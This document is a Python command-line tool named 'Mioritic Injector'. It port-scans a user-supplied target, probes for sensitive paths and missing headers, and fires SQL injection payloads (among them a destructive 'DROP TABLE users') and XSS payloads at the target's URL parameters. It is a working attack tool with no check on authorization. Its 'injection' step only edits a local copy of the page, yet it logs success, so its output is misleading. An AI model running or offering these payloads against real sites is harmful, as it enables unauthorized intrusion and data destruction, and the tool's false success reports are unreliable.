#!/usr/bin/env python3
"""
Command Line Mioritic Injector
"""

import socket
import requests
import time
from urllib.parse import urlparse
import urllib.parse

def log(message):
    """Print log message with timestamp"""
    print(f"[{time.strftime('%H:%M:%S')}] {message}")

def validate_url(url):
    """Validate URL format"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        return bool(parsed.netloc)
    except:
        return False

def scan_ports(url):
    """Scan for open ports on target"""
    try:
        parsed = urlparse(url)
        host = parsed.netloc.split(':')[0]
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
                
        return open_ports
    except Exception as e:
        log(f"Port scan error: {str(e)}")
        return []

def scan_vulnerabilities(url):
    """Scan for common vulnerabilities"""
    vulnerabilities = []
    
    try:
        # Test for common security headers
        response = requests.get(url, timeout=10, allow_redirects=False)
        
        security_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        
        for header in security_headers:
            if header not in response.headers:
                vulnerabilities.append(f"Missing {header} header")
                
        # Check for server information disclosure
        if 'Server' in response.headers:
            vulnerabilities.append(f"Server info disclosed: {response.headers['Server']}")
            
        # Check for directory listing
        test_urls = [
            url + '/admin',
            url + '/backup',
            url + '/config',
            url + '/.git',
            url + '/phpinfo.php'
        ]
        
        for test_url in test_urls:
            try:
                test_response = requests.get(test_url, timeout=5)
                if test_response.status_code == 200:
                    vulnerabilities.append(f"Potential sensitive path: {test_url}")
            except:
                pass
                
    except Exception as e:
        log(f"Vulnerability scan error: {str(e)}")
        
    return vulnerabilities

def analyze_and_inject(url, injection_word):
    """Analyze page content and attempt injection"""
    try:
        response = requests.get(url, timeout=10)
        
        # Simple text analysis
        text_content = response.text.lower()
        
        log(f"Analyzing page content...")
        log(f"Page size: {len(response.text)} characters")
        
        # Look for injection points
        injection_points = []
        
        # Check for common text patterns
        common_words = ['test', 'hello', 'welcome', 'home', 'page', 'content']
        
        for word in common_words:
            if word in text_content:
                injection_points.append(word)
                
        log(f"Found {len(injection_points)} potential injection points")
        
        # Attempt to inject content
        for i, point in enumerate(injection_points[:5]):
            log(f"Attempting injection {i+1}: replacing '{point}' with '{injection_word}'")
            
            # Simulate injection attempt
            modified_content = text_content.replace(point, injection_word)
            if modified_content != text_content:
                log(f"✓ Successfully injected '{injection_word}' into content")
                
    except Exception as e:
        log(f"Content analysis error: {str(e)}")

def test_sql_injection(url, injection_word):
    """Test for SQL injection vulnerabilities"""
    sql_payloads = [
        f"' OR '1'='1",
        f"' UNION SELECT NULL--",
        f"'; DROP TABLE users--",
        f"' OR 1=1#",
        f"admin'--"
    ]
    
    # Test URL parameters
    parsed = urlparse(url)
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query)
        
        for param, values in params.items():
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                try:
                    response = requests.get(test_url, params=test_params, timeout=5)
                    
                    # Check for SQL error indicators
                    error_indicators = [
                        'sql syntax',
                        'mysql_fetch',
                        'ORA-',
                        'PostgreSQL',
                        'SQLite',
                        'Microsoft SQL'
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            log(f"✓ Potential SQL injection found in parameter '{param}'")
                            break
                            
                except:
                    pass

def test_xss_injection(url, injection_word):
    """Test for XSS vulnerabilities"""
    xss_payloads = [
        f"<script>alert('{injection_word}')</script>",
        f"<img src=x onerror=alert('{injection_word}')>",
        f"javascript:alert('{injection_word}')",
        f"<svg onload=alert('{injection_word}')>",
        f"<iframe src=javascript:alert('{injection_word}')>"
    ]
    
    # Test URL parameters
    parsed = urlparse(url)
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query)
        
        for param, values in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                try:
                    response = requests.get(test_url, params=test_params, timeout=5)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        log(f"✓ Potential XSS found in parameter '{param}'")
                        
                except:
                    pass

def main():
    """Main function"""
    print("=== MIORITIC INJECTOR - COMMAND LINE VERSION ===")
    print("")
    
    # Get user input
    target_url = input("Enter target URL: ").strip()
    injection_word = input("Enter word to inject: ").strip()
    
    if not target_url or not injection_word:
        print("ERROR: Please provide both URL and injection word!")
        return
    
    print("")
    log("=== MIORITIC INJECTOR STARTED ===")
    log(f"Target URL: {target_url}")
    log(f"Injection Word: {injection_word}")
    print("")
    
    # Step 1: Validate URL
    log("Step 1: Validating target URL...")
    if not validate_url(target_url):
        log("ERROR: Invalid URL format!")
        return
    log("✓ URL validation passed")
    
    # Step 2: Port scanning
    log("Step 2: Scanning for open ports...")
    open_ports = scan_ports(target_url)
    log(f"✓ Found {len(open_ports)} open ports: {open_ports}")
    
    # Step 3: Vulnerability scanning
    log("Step 3: Scanning for vulnerabilities...")
    vulnerabilities = scan_vulnerabilities(target_url)
    log(f"✓ Found {len(vulnerabilities)} potential vulnerabilities")
    
    # Step 4: Content analysis and injection
    log("Step 4: Analyzing page content...")
    analyze_and_inject(target_url, injection_word)
    
    # Step 5: SQL injection testing
    log("Step 5: Testing SQL injection vulnerabilities...")
    test_sql_injection(target_url, injection_word)
    
    # Step 6: XSS testing
    log("Step 6: Testing XSS vulnerabilities...")
    test_xss_injection(target_url, injection_word)
    
    print("")
    log("=== INJECTION PROCESS COMPLETED ===")
    log("All tests completed successfully!")

if __name__ == "__main__":
    main()